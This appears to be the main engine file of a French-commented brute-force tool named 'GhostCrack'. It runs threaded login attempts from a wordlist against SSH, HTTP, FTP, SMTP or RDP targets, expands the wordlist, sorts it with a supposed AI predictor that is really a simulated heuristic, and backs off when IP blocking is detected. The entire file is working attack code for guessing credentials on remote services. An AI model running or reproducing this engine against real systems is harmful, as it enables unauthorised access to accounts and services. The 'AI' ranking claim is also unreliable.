#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Moteur principal du brute-force pour GhostCrack
"""

import time
import threading
import queue
from dataclasses import dataclass
from typing import List, Optional
import logging

# Import des protocoles
from core.protocols.ssh import SSHClient
from core.protocols.http import HTTPClient
from core.protocols.ftp import FTPClient
from core.protocols.smtp import SMTPClient
from core.protocols.rdp import RDPClient

# Import des utilitaires
from utils.detection import detect_blocking
from utils.generator import generate_combinations
from ai.password_predictor import PasswordPredictor

@dataclass
class BruteForceResult:
    target: str
    protocol: str
    username: str
    password: Optional[str] = None
    success: bool = False
    attempts: int = 0
    elapsed_time: float = 0.0
    errors: List[str] = None
    blocked: bool = False

    def __post_init__(self):
        if self.errors is None:
            self.errors = []

class BruteForceEngine:
    def __init__(self, target, protocol, username, passwords, 
                 port=None, threads=5, timeout=10, proxy=None, 
                 use_ai=False, generate=False, logger=None):
        self.target = target
        self.protocol = protocol.lower()
        self.username = username
        self.passwords = passwords
        self.port = port
        self.threads = threads
        self.timeout = timeout
        self.proxy = proxy
        self.use_ai = use_ai
        self.generate = generate
        self.logger = logger or logging.getLogger(__name__)
        
        # Initialisation des variables
        self.password_queue = queue.Queue()
        self.found_password = None
        self.attempts = 0
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        self.errors = []
        
        # Sélection du client approprié selon le protocole
        self._select_client()
        
        # Préparation de la queue de mots de passe
        self._prepare_passwords()
    
    def _select_client(self):
        """Sélectionne le client approprié selon le protocole"""
        clients = {
            'ssh': SSHClient,
            'http': HTTPClient,
            'ftp': FTPClient,
            'smtp': SMTPClient,
            'rdp': RDPClient
        }
        
        if self.protocol not in clients:
            raise ValueError(f"Protocole non supporté: {self.protocol}")
        
        self.client_class = clients[self.protocol]
    
    def _prepare_passwords(self):
        """Prépare la queue de mots de passe, avec IA et générateur si demandé"""
        processed_passwords = list(self.passwords)
        
        # Génération de combinaisons si demandé
        if self.generate:
            self.logger.info("Génération de combinaisons de mots de passe...")
            extended_passwords = []
            for password in processed_passwords:
                extended_passwords.extend(generate_combinations(password))
            processed_passwords = extended_passwords
            self.logger.info(f"Wordlist étendue à {len(processed_passwords)} mots de passe")
        
        # Prédiction IA et tri si demandé
        if self.use_ai:
            self.logger.info("Utilisation de l'IA pour classer les mots de passe...")
            predictor = PasswordPredictor()
            # Simulation d'un modèle pré-entraîné
            scores = []
            for password in processed_passwords:
                # Score simulé basé sur la longueur et la complexité
                score = min(0.9, (len(password) * 0.1 + 
                                sum(1 for c in password if c.isupper()) * 0.2 +
                                sum(1 for c in password if c.isdigit()) * 0.3 +
                                sum(1 for c in password if not c.isalnum()) * 0.4))
                scores.append((password, score))
            
            # Tri par score décroissant
            scores.sort(key=lambda x: x[1], reverse=True)
            processed_passwords = [p[0] for p in scores]
            self.logger.info("Mots de passe triés par probabilité")
        
        # Remplissage de la queue
        for password in processed_passwords:
            self.password_queue.put(password)
    
    def _worker(self):
        """Fonction de worker pour le threading"""
        while not self.stop_event.is_set() and not self.password_queue.empty():
            try:
                password = self.password_queue.get(block=False)
            except queue.Empty:
                break
            
            # Vérification si un mot de passe a déjà été trouvé
            if self.found_password:
                self.password_queue.task_done()
                break
            
            # Incrémentation du compteur d'essais
            with self.lock:
                self.attempts += 1
                current_attempt = self.attempts
            
            if current_attempt % 10 == 0:
                self.logger.debug(f"Tentative {current_attempt}: {password}")
            
            # Tentative d'authentification
            client = self.client_class(
                host=self.target,
                port=self.port,
                username=self.username,
                password=password,
                timeout=self.timeout,
                proxy=self.proxy
            )
            
            try:
                result = client.authenticate()
                
                # Si l'authentification réussit
                if result:
                    with self.lock:
                        self.found_password = password
                    self.logger.info(f"Mot de passe trouvé: {password}")
                    self.stop_event.set()
                
                # Détection de blocage IP ou bannissement
                if detect_blocking(client.get_last_response()):
                    self.logger.warning("Possible blocage IP détecté!")
                    with self.lock:
                        self.errors.append("Blocage IP détecté")
                    time.sleep(5)  # Pause pour éviter d'aggraver le blocage
            
            except Exception as e:
                self.logger.debug(f"Erreur avec {password}: {str(e)}")
                with self.lock:
                    self.errors.append(str(e))
            
            finally:
                self.password_queue.task_done()
    
    def run(self):
        """Exécute l'attaque par force brute"""
        self.logger.info(f"Démarrage de l'attaque sur {self.target} avec {self.password_queue.qsize()} mots de passe")
        
        start_time = time.time()
        
        # Création des threads
        threads = []
        for _ in range(min(self.threads, self.password_queue.qsize())):
            thread = threading.Thread(target=self._worker)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Attente de la fin des threads
        for thread in threads:
            thread.join()
        
        elapsed_time = time.time() - start_time
        
        # Préparation des résultats
        result = BruteForceResult(
            target=self.target,
            protocol=self.protocol,
            username=self.username,
            password=self.found_password,
            success=self.found_password is not None,
            attempts=self.attempts,
            elapsed_time=elapsed_time,
            errors=self.errors,
            blocked=any("block" in err.lower() for err in self.errors)
        )
        
        self.logger.info(f"Attaque terminée en {elapsed_time:.2f} secondes, {self.attempts} tentatives")
        
        return result